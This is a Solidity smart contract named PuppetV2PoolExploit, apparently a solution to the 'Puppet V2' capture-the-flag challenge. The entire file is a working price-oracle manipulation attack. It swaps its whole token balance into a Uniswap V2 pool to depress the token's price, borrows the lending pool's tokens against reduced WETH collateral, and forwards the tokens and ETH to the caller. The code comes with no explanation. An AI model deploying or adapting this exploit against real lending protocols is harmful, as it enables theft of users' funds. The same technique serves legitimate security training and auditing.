// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount)
        external
        view
        returns (uint256);
}

interface IWETH {
    function approve(address spender, uint256 amount) external;

    function balanceOf(address account) external returns (uint256);

    function deposit() external payable;

    function withdraw(uint256 wad) external;
}

contract PuppetV2PoolExploit {
    IPool immutable pool;
    IERC20 immutable token;
    IUniswapV2Router02 immutable router;

    receive() external payable {}

    constructor(
        address _pool,
        address _token,
        address _router
    ) {
        pool = IPool(_pool);
        token = IERC20(_token);
        router = IUniswapV2Router02(_router);
    }

    function work(uint256 amount) external {
        uint256 bal = token.balanceOf(address(this));

        IERC20(address(token)).approve(address(router), bal);

        IWETH WETH = IWETH(router.WETH());

        WETH.deposit{value: payable(this).balance}();

        address[] memory path = new address[](2);

        path[0] = address(token);
        path[1] = address(WETH);

        router.swapExactTokensForTokens(
            bal,
            0,
            path,
            address(this),
            block.timestamp
        );

        WETH.approve(address(pool), WETH.balanceOf(address(this)));

        pool.borrow(amount);

        uint256 _amount = token.balanceOf(address(this));

        token.transfer(msg.sender, _amount);

        WETH.withdraw(WETH.balanceOf(address(this)));

        (bool result, ) = msg.sender.call{value: payable(this).balance}("");

        require(result);
    }
}
